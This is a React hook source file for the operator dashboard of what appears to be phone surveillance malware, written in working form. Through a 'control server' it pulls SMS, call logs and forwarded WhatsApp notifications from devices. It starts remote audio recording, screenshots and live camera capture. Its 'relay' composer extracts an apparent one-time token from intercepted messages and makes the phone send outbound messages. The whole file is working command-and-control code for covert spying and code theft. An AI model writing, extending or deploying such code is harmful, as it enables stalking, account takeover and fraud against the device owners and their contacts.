import { useEffect, useMemo, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { io } from 'socket.io-client';
import { DASHBOARD_ROUTES } from '../config/navigation';
import { extractRecipient, extractToken, normalizeRecipient } from '../utils/relay';

const SOCKET_SERVER_URL = `${window.location.protocol}//${window.location.hostname}:3000`;

export function useDashboardController(locationPathname) {
  const navigate = useNavigate();
  const selectedDeviceIdRef = useRef('');
  const relayAckTimerRef = useRef(null);
  const [socket, setSocket] = useState(null);
  const [connected, setConnected] = useState(false);
  const [db, setDb] = useState({
    devices: {},
    sms: [],
    call_logs: [],
    whatsapp: [],
    recordings: [],
    photos: [],
  });
  const [selectedDeviceId, setSelectedDeviceId] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [liveAlert, setLiveAlert] = useState(null);
  const [syncing, setSyncing] = useState(false);
  const [micStatus, setMicStatus] = useState({});
  const [cameraLiveStatus, setCameraLiveStatus] = useState({});
  const [selectedCameraLens, setSelectedCameraLens] = useState('back');
  const [relayContext, setRelayContext] = useState(null);
  const [relayChannel, setRelayChannel] = useState('sms');
  const [relayRecipient, setRelayRecipient] = useState('');
  const [relayBody, setRelayBody] = useState('');
  const [detectedToken, setDetectedToken] = useState('');
  const [relayStatus, setRelayStatus] = useState('');
  const [relayStatusKind, setRelayStatusKind] = useState('info');
  const [relaySmsOpenAppFirst, setRelaySmsOpenAppFirst] = useState(false);
  const [relaySmsAutoSend, setRelaySmsAutoSend] = useState(true);
  const [playingAudioUrl, setPlayingAudioUrl] = useState(null);
  const [audioElement, setAudioElement] = useState(null);

  const activeRoute = useMemo(() => {
    return DASHBOARD_ROUTES.find(tab => tab.path === locationPathname) || DASHBOARD_ROUTES[0];
  }, [locationPathname]);

  const activeTab = activeRoute.key;

  useEffect(() => {
    const knownRoute = DASHBOARD_ROUTES.some(tab => tab.path === locationPathname);
    if (!knownRoute) {
      navigate('/overview', { replace: true });
    }
  }, [locationPathname, navigate]);

  useEffect(() => {
    setSearchQuery('');
  }, [locationPathname]);

  useEffect(() => {
    selectedDeviceIdRef.current = selectedDeviceId;
  }, [selectedDeviceId]);

  const fetchDB = async () => {
    try {
      const res = await fetch(`${SOCKET_SERVER_URL}/api/data`);
      if (res.ok) {
        const data = await res.json();
        setDb(data);
      }
    } catch (err) {
      console.error('Failed to fetch database updates:', err);
    }
  };

  useEffect(() => {
    console.log('Connecting to socket server:', SOCKET_SERVER_URL);
    const newSocket = io(SOCKET_SERVER_URL);
    setSocket(newSocket);

    newSocket.on('connect', () => {
      setConnected(true);
      console.log('Connected to control server');
      newSocket.emit('dashboard:register');
    });

    newSocket.on('disconnect', () => {
      setConnected(false);
      console.log('Disconnected from control server');
    });

    newSocket.on('dashboard:init', data => {
      console.log('Received initial database:', data);
      setDb(data);
      const deviceIds = Object.keys(data.devices || {});
      if (deviceIds.length > 0) {
        setSelectedDeviceId(current => current || deviceIds[0]);
      }
    });

    newSocket.on('device_status_change', data => {
      console.log('Device status change:', data);
      setDb(prev => {
        const updatedDevices = { ...prev.devices };
        updatedDevices[data.deviceId] = {
          ...updatedDevices[data.deviceId],
          deviceName: data.deviceName,
          status: data.status,
          lastSeen: data.lastSeen,
        };
        return { ...prev, devices: updatedDevices };
      });
      setSelectedDeviceId(current => current || data.deviceId);
    });

    newSocket.on('data_updated', () => {
      fetchDB();
    });

    newSocket.on('device:whatsapp_received', data => {
      setDb(prev => ({
        ...prev,
        whatsapp: [data, ...prev.whatsapp],
      }));
    });

    newSocket.on('device:livecall_alert', data => {
      console.log('Live call alert received:', data);
      setLiveAlert(data);
      setTimeout(() => {
        setLiveAlert(null);
      }, 8000);
    });

    newSocket.on('device:mic_status', data => {
      console.log('Mic status update:', data);
      setMicStatus(prev => ({ ...prev, [data.deviceId]: data.status }));
    });

    newSocket.on('device:camera_live_status', data => {
      console.log('Live camera status update:', data);
      setCameraLiveStatus(prev => ({
        ...prev,
        [data.deviceId]: {
          status: data.status,
          camera: data.camera,
          intervalMs: data.intervalMs,
          timestamp: data.timestamp,
        },
      }));
    });

    newSocket.on('device:command_result', data => {
      if (!data || data.deviceId !== selectedDeviceIdRef.current) {
        return;
      }

      if (data.action === 'SEND_OUTBOUND_MESSAGE') {
        if (relayAckTimerRef.current) {
          clearTimeout(relayAckTimerRef.current);
          relayAckTimerRef.current = null;
        }
        setRelayStatus(String(data.message || (data.success ? 'Message command succeeded.' : 'Message command failed.')));
        setRelayStatusKind(data.success ? 'success' : 'error');
      }
    });

    return () => {
      newSocket.close();
    };
  }, []);

  const sendCommand = (action, payload = {}) => {
    const deviceStatus = db.devices[selectedDeviceId]?.status;
    if (!socket || !socket.connected || !selectedDeviceId || deviceStatus !== 'online') {
      return false;
    }
    setSyncing(true);
    socket.emit('dashboard:command', {
      deviceId: selectedDeviceId,
      action,
      payload,
    });
    setTimeout(() => setSyncing(false), 2000);
    return true;
  };

  const activeDevice = useMemo(() => {
    return db.devices[selectedDeviceId] || null;
  }, [db.devices, selectedDeviceId]);

  const handlePlayAudio = url => {
    const fullUrl = `${SOCKET_SERVER_URL}${url}`;
    if (playingAudioUrl === fullUrl) {
      audioElement.pause();
      setPlayingAudioUrl(null);
    } else {
      if (audioElement) {
        audioElement.pause();
      }
      const newAudio = new Audio(fullUrl);
      newAudio.play();
      setAudioElement(newAudio);
      setPlayingAudioUrl(fullUrl);
      newAudio.onended = () => setPlayingAudioUrl(null);
    }
  };

  useEffect(() => {
    return () => {
      if (audioElement) {
        audioElement.pause();
      }
    };
  }, [audioElement]);

  const filteredSms = useMemo(() => {
    return db.sms
      .filter(item => item.device_id === selectedDeviceId)
      .filter(item =>
        item.address.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.body.toLowerCase().includes(searchQuery.toLowerCase()),
      )
      .sort((a, b) => new Date(b.date) - new Date(a.date));
  }, [db.sms, searchQuery, selectedDeviceId]);

  const filteredCallLogs = useMemo(() => {
    return db.call_logs
      .filter(item => item.device_id === selectedDeviceId)
      .filter(item =>
        item.phoneNumber.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.name.toLowerCase().includes(searchQuery.toLowerCase()),
      )
      .sort((a, b) => new Date(b.timestamp || b.dateTime) - new Date(a.timestamp || a.dateTime));
  }, [db.call_logs, searchQuery, selectedDeviceId]);

  const filteredPhotos = useMemo(() => {
    return db.photos
      .filter(item => item.device_id === selectedDeviceId)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  }, [db.photos, selectedDeviceId]);

  const latestCameraPhoto = useMemo(() => {
    return filteredPhotos.find(item => item.type !== 'screenshot') || null;
  }, [filteredPhotos]);

  const filteredRecordings = useMemo(() => {
    return db.recordings
      .filter(item => item.device_id === selectedDeviceId)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  }, [db.recordings, selectedDeviceId]);

  const filteredWhatsapp = useMemo(() => {
    return db.whatsapp
      .filter(item => item.device_id === selectedDeviceId)
      .filter(item =>
        item.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        item.text.toLowerCase().includes(searchQuery.toLowerCase()),
      )
      .sort((a, b) => new Date(b.date) - new Date(a.date));
  }, [db.whatsapp, searchQuery, selectedDeviceId]);

  const isLiveCameraActive = cameraLiveStatus[selectedDeviceId]?.status === 'active';

  const openRelayComposer = (sourceType, item) => {
    const messageText = sourceType === 'sms' ? item.body : item.text;
    const sender = sourceType === 'sms' ? item.address : item.title;
    const token = extractToken(messageText);
    const smsRecipient = sourceType === 'sms'
      ? normalizeRecipient(sender)
      : (extractRecipient(sender) || extractRecipient(messageText));
    const defaultBody = token ? String(token) : String(messageText || '');

    setRelayContext({
      sourceType,
      sender,
      messageText,
      time: sourceType === 'sms' ? item.date : item.date,
    });
    setRelayChannel(sourceType === 'sms' ? 'sms' : 'whatsapp');
    setRelayRecipient(smsRecipient);
    setRelayBody(defaultBody);
    setDetectedToken(token);
    if (relayAckTimerRef.current) {
      clearTimeout(relayAckTimerRef.current);
      relayAckTimerRef.current = null;
    }
    setRelayStatus('');
    setRelayStatusKind('info');
    navigate('/relay');
  };

  const handleRelaySend = () => {
    if (!relayRecipient.trim() || !relayBody.trim()) {
      setRelayStatus('Recipient and message are required.');
      setRelayStatusKind('error');
      return;
    }

    const sent = sendCommand('SEND_OUTBOUND_MESSAGE', {
      channel: relayChannel,
      recipient: relayRecipient.trim(),
      message: relayBody.trim(),
      token: detectedToken || null,
      source: relayContext || null,
      smsBehavior: {
        openAppFirst: relaySmsOpenAppFirst,
        autoSend: relaySmsAutoSend,
      },
    });

    if (!sent) {
      setRelayStatus('Please select an online device before sending.');
      setRelayStatusKind('error');
      return;
    }

    setRelayStatus('Command dispatched. Waiting for phone confirmation...');
    setRelayStatusKind('info');

    if (relayAckTimerRef.current) {
      clearTimeout(relayAckTimerRef.current);
    }
    relayAckTimerRef.current = setTimeout(() => {
      setRelayStatus('No phone confirmation received yet. Please restart server/app once and try again.');
      setRelayStatusKind('error');
      relayAckTimerRef.current = null;
    }, 8000);
  };

  const openQuickSmsComposer = () => {
    setRelayContext(null);
    setRelayChannel('sms');
    setRelayRecipient('');
    setRelayBody('');
    setDetectedToken('');
    if (relayAckTimerRef.current) {
      clearTimeout(relayAckTimerRef.current);
      relayAckTimerRef.current = null;
    }
    setRelayStatus('');
    setRelayStatusKind('info');
    navigate('/relay');
  };

  const actionGroups = [
    {
      title: 'Data Sync',
      subtitle: 'Pull latest logs from the selected device',
      actions: [
        { label: 'Sync SMS', action: 'FETCH_SMS', className: 'btn btn-outline' },
        { label: 'Sync Call Logs', action: 'FETCH_CALL_LOGS', className: 'btn btn-outline' },
      ],
    },
    {
      title: 'Media & Screen',
      subtitle: 'Capture and upload current device screen',
      actions: [
        { label: 'Take Screenshot', action: 'TAKE_SCREENSHOT', className: 'btn btn-primary' },
      ],
      note: 'Camera capture from fully background-killed state is OS-restricted; screenshot is supported reliably.',
    },
    {
      title: 'Audio Control',
      subtitle: 'Start or stop remote recording flow',
      actions: [
        { label: 'Start Recording', action: 'START_RECORDING', className: 'btn btn-danger' },
        { label: 'Stop & Upload Recording', action: 'STOP_RECORDING', className: 'btn btn-outline' },
      ],
    },
    {
      title: 'WhatsApp Listener',
      subtitle: 'Enable or disable notification listener forwarding',
      actions: [
        { label: 'Start Listener', action: 'WHATSAPP_START', className: 'btn btn-primary' },
        { label: 'Stop Listener', action: 'WHATSAPP_STOP', className: 'btn btn-outline' },
      ],
    },
  ];

  return {
    socketServerUrl: SOCKET_SERVER_URL,
    activeRoute,
    activeTab,
    connected,
    db,
    selectedDeviceId,
    setSelectedDeviceId,
    searchQuery,
    setSearchQuery,
    liveAlert,
    syncing,
    micStatus,
    cameraLiveStatus,
    selectedCameraLens,
    setSelectedCameraLens,
    relayContext,
    relayChannel,
    setRelayChannel,
    relayRecipient,
    setRelayRecipient,
    relayBody,
    setRelayBody,
    detectedToken,
    setDetectedToken,
    relayStatus,
    relayStatusKind,
    relaySmsOpenAppFirst,
    relaySmsAutoSend,
    activeDevice,
    filteredSms,
    filteredCallLogs,
    filteredPhotos,
    latestCameraPhoto,
    filteredRecordings,
    filteredWhatsapp,
    isLiveCameraActive,
    actionGroups,
    fetchDB,
    sendCommand,
    handlePlayAudio,
    playingAudioUrl,
    openRelayComposer,
    handleRelaySend,
    openQuickSmsComposer,
    setRelayBody,
  };
}
